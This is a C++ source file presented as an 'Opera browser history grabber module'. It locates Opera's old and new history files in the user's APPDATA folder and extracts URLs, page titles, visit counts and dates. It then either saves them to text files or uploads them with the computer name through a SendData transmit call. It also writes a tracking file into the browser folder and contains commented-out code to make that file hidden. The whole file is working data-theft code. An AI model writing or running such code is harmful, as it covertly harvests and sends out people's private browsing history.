/*
    Opera browser history grabber module;
    Grabs browsing history

    Author: Kulverstukas
*/

#include <sqlite3.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <string>
#include <time.h>
#include <algorithm>
#include <sys/stat.h>
#include "OperaHistory.hpp"
#include "SendData.hpp"

using namespace std;

const string OLD_OPERA_APPDATA_PATH = "Opera\\Opera";
const string APPDATA = "appdata";
const string OLD_OPERA_HISTORY_FILE = "global_history.dat";
const string OPERA_CONTROL_FILE = "opcontrol.dat";
const string NEW_OPERA_HISTORY_FILE = "History";
const string NEW_OPERA_APPDATA_PATH = "Opera Software\\Opera Stable";
const string SQL_QUERY = "SELECT url, title, visit_count, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime'), last_visit_time FROM urls WHERE (last_visit_time > %s) AND (url NOT LIKE \"file:///%%\")";
extern bool upload;
string operaDataStr;
extern string lastMillis;
ofstream dataFile;

void OperaHistory::detectOperaVersion(bool upload, char* compName) {
    ifstream old((((string)getenv(APPDATA.c_str()))+"\\"+OLD_OPERA_APPDATA_PATH+"\\"+OLD_OPERA_HISTORY_FILE).c_str());
    if (old.good()) {
        old.close();
        readOldFile(upload, compName);
    }
    ifstream newF((((string)getenv(APPDATA.c_str()))+"\\"+NEW_OPERA_APPDATA_PATH+"\\"+NEW_OPERA_HISTORY_FILE).c_str());
    if (newF.good()) {
        newF.close();
        readNewFile(upload, compName);
    }
}

void OperaHistory::readNewFile(bool argv, char* compName) {
    upload = argv;
    string path = (((string)getenv(APPDATA.c_str()))+"\\"+NEW_OPERA_APPDATA_PATH+"\\");
    // create stuff
    struct OperaHistoryData ohData;
    operaDataStr = "";
    SendData sendData;
    string prevOperaMillis = "0";

    prevOperaMillis = getPrevMillis(path);

    if (!upload) {
        dataFile.open("Opera_new.txt", ios::app);
    }
    sqlite3 *dbObj;
    int k = sqlite3_open_v2((path+NEW_OPERA_HISTORY_FILE).c_str(), &dbObj, SQLITE_OPEN_READONLY, NULL);
    if (k == SQLITE_OK) {
        char fQuery[210];
        sprintf(fQuery, SQL_QUERY.c_str(), prevOperaMillis.c_str());
        //printf("%s\n", fQuery);
        sqlite3_exec(dbObj, fQuery, grabOperaDataCallback, NULL, NULL);
        if (upload) {
            sendData.transmit("Opera", compName, "Opera_new.txt", operaDataStr);
        } else {
            dataFile.close();
        }

        // write to the control file
        writeToControlFile(path, lastMillis);
        // situ galbut net ir nereikia?
//        int attribs = GetFileAttributes(controlF.c_str());
//        if ((attribs != FILE_ATTRIBUTE_HIDDEN) and (attribs != FILE_ATTRIBUTE_SYSTEM)) {
//            SetFileAttributes(controlF.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
//        }
    }
}

int grabOperaDataCallback(void *NotUsed, int argc, char **argv, char **azColName) {
    if (upload) {
        operaDataStr.append("URL:\t"); operaDataStr.append(argv[0] ? argv[0] : "EMPTY"); operaDataStr.append("\n");
        operaDataStr.append("Title:\t"); operaDataStr.append(argv[1] ? argv[1] : "EMPTY"); operaDataStr.append("\n");
        operaDataStr.append("Visits:\t"); operaDataStr.append(argv[2] ? argv[2] : "EMPTY"); operaDataStr.append("\n");
        operaDataStr.append("Date:\t"); operaDataStr.append(argv[3] ? argv[3] : "EMPTY"); operaDataStr.append("\n");
        operaDataStr.append("\n");
    } else {
        dataFile << "URL:\t" << (argv[0] ? argv[0] : "EMPTY") << endl;
        dataFile << "Title:\t" << (argv[1] ? argv[1] : "EMPTY") << endl;
        dataFile << "Visits:\t" << (argv[2] ? argv[2] : "EMPTY") << endl;
        dataFile << "Date:\t" << (argv[3] ? argv[3] : "EMPTY") << endl;
        dataFile << "\n";
    }
    lastMillis = argv[4];
    return 0;
}

void OperaHistory::readOldFile(bool upload, char* compName) {
    // create stuff
    string path = (((string)getenv(APPDATA.c_str()))+"\\"+OLD_OPERA_APPDATA_PATH+"\\");
    struct OperaHistoryData ohData;
    operaDataStr = "";
    SendData sendData;

    // check if control file exists
    long prevMillis = atol(getPrevMillis(path).c_str());

    // do the actual reading and parsing of the history file
    ifstream operaFile((path+OLD_OPERA_HISTORY_FILE).c_str());
    long int rawMillis = 0;
    string line;
    int counter = 0;
    if (!upload) {
        dataFile.open("Opera_old.txt", ios::app);
    }
    while (!operaFile.eof()) {
        getline(operaFile, line);
        counter++;
        if (counter == 1) { ohData.title = line; }
        else if (counter == 2) { ohData.url = line; }
        else if (counter == 3) {
            ohData.datetime = this->convertMillisToDatetime(line);
            rawMillis = atol(line.c_str());
        }
        else if (counter == 4) {
            int visits = atol(line.c_str());
            if (visits >= 0) { ohData.visits = "1"; }
            else if (visits < 0) { ohData.visits = ">1"; }
            counter = 0;
            if (rawMillis > prevMillis) {
               this->writeOperaData(ohData, dataFile, upload, operaDataStr);
            }
        }
    }
    if (upload) {
        sendData.transmit("Opera", compName, "Opera_old.txt", operaDataStr);
    } else {
        dataFile.close();
    }

    operaFile.close();
    char q[20];
    sprintf(q, "%ld", rawMillis);
    writeToControlFile(path, q);
}

void OperaHistory::writeToControlFile(string path, string lastMillis) {
    ofstream controlFile((path+OPERA_CONTROL_FILE).c_str());
    if (controlFile.is_open() and controlFile.good()) {
        controlFile << lastMillis << endl;
        //controlFile << 0 << endl;
    }
    controlFile.close();
}

string OperaHistory::getPrevMillis(string path) {
    struct stat buff;
    string prevMillis = "0";
    if (stat((path+OPERA_CONTROL_FILE).c_str(), &buff) != -1) {
        ifstream controlFile((path+OPERA_CONTROL_FILE).c_str());
        if (controlFile.is_open() and controlFile.good()) {
            getline(controlFile, prevMillis);
        }
        controlFile.close();
    }
    return prevMillis;
}

string OperaHistory::convertMillisToDatetime(string datetime) {
    time_t rawtime = atol(datetime.c_str());
    struct tm *convertedTime;
    convertedTime = localtime(&rawtime);
    char result[22];
    strftime(result, 22, "%Y.%m.%d, %X", convertedTime);
    return (string)result;
}

void OperaHistory::writeOperaData(OperaHistoryData data, ofstream &newFile, bool upload, string &dataStr) {
    if (upload) {
        dataStr.append("URL:\t"); dataStr.append(data.url); dataStr.append("\n");
        dataStr.append("Title:\t"); dataStr.append(data.title); dataStr.append("\n");
        dataStr.append("Date:\t"); dataStr.append(data.datetime); dataStr.append("\n");
        dataStr.append("Visits:\t"); dataStr.append(data.visits); dataStr.append("\n");
        dataStr.append("\n");
    } else {
        newFile << "URL:\t" << data.url << endl;
        newFile << "Title:\t" << data.title << endl;
        newFile << "Date:\t" << data.datetime << endl;
        newFile << "Visits:\t" << data.visits << endl;
        newFile << "\n";
    }
};
